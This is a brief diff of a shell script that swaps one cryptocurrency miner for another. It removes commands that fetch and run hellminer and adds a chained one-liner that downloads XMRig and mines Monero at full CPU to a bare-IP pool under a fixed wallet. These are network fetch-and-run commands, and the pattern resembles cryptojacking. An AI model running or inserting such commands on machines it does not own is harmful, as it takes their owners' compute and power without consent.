@@ -1,3 +1,1 @@
-wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
-tar xf hellminer_cpu_linux.tar.gz
-./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RKdEb8KtfEf76aaaLhr37UqrfoPeiva1zM.blade333 -p x --cpu
+wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-x64.tar.gz && tar -xf xmrig-6.15.0-linux-x64.tar.gz && cd xmrig-6.15.0 && ./xmrig --max-cpu-usage 100 --donate-level 5 -o 168.235.86.33:3393 -u SK_pDKo9B7rTqyPDrYeohNv5.blade333 -k --coin monero -a cn/gpu
